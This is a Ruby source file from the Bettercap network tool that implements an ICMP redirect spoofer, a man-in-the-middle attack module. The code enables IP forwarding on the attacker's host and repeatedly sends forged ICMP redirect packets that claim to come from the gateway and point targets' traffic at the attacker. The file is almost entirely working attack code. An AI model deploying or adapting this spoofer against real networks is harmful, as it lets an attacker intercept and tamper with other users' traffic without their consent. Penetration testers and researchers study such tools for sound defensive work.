=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
require 'bettercap/spoofers/base'
require 'bettercap/error'
require 'bettercap/context'
require 'bettercap/network'
require 'bettercap/logger'
require 'colorize'

module BetterCap
module Spoofers
# This class is responsible of performing ICMP redirect attack on the network.
class Icmp < Base
  ICMP_REDIRECT      = 5
  ICMP_REDIRECT_HOST = 1

  # Initialize the BetterCap::Spoofers::Icmp object.
  def initialize
    Logger.warn "!!! 'BetterCap::Spoofers::Icmp' IS AN EXPERIMENTAL MODULE, IT'S NOT GUARANTEED TO WORK !!!\n"

    @ctx          = Context.get
    @forwarding   = @ctx.firewall.forwarding_enabled?
    @gateway      = nil
    @address      = @ctx.ifconfig[:ip_saddr]
    @spoof_thread = nil
    @running      = false

    Logger.info "Getting gateway #{@ctx.gateway} MAC address ..."

    hw = Network.get_hw_address( @ctx.ifconfig, @ctx.gateway )
    raise BetterCap::Error, "Couldn't determine router MAC" if hw.nil?

    @gateway = Target.new( @ctx.gateway, hw )

    Logger.info "  #{@gateway}"
  end

  # Send an ICMP redirect to the target identified by the +target+ IP address.
  def send_spoofed_packet( target )
    Logger.debug "Sending ICMP Redirect to #{target.to_s_compact} from #{@address} ..."

    pkt           = PacketFu::ICMPPacket.new
    pkt.eth_saddr = @gateway.mac
    pkt.eth_daddr = target.mac
    pkt.icmp_type = ICMP_REDIRECT
    pkt.icmp_code = ICMP_REDIRECT_HOST
    pkt.ip_saddr  = @gateway.ip
    pkt.ip_daddr  = target.ip
    pkt.payload   = @address.split('.').collect(&:to_i).pack('C*') + "aaaa"

    pkt.recalc
    pkt.to_w(@ctx.ifconfig[:iface])
  end

  # Start the ICMP redirect spoofing.
  def start
    Logger.info "Starting ICMP redirect spoofer ..."

    stop() if @running
    @running = true

    @ctx.firewall.enable_forwarding(true) unless @forwarding

    @spoof_thread = Thread.new { icmp_spoofer }
  end

  # Stop the ICMP redirect spoofing, reset firewall state.
  def stop
    raise 'ICMP redirect spoofer is not running' unless @running

    Logger.info 'Stopping ICMP redirect spoofer ...'

    Logger.debug "Resetting packet forwarding to #{@forwarding} ..."
    @ctx.firewall.enable_forwarding( @forwarding )

    @running = false
    begin
      @spoof_thread.exit
    rescue
    end
  end

  private

  def icmp_spoofer
    prev_size = @ctx.targets.size
    loop do
      if not @running
          Logger.debug 'Stopping spoofing thread ...'
          Thread.exit
          break
      end

      size = @ctx.targets.size
      if size > prev_size
        Logger.warn "Aquired #{size - prev_size} new targets."
      elsif size < prev_size
        Logger.warn "Lost #{prev_size - size} targets."
      end

      Logger.debug "Spoofing #{@ctx.targets.size} targets ..."

      update_targets!

      @ctx.targets.each do |target|
        unless target.ip.nil? or target.mac.nil?
          send_spoofed_packet target
        end
      end

      prev_size = @ctx.targets.size

      sleep(1)
    end
  end
end
end
end
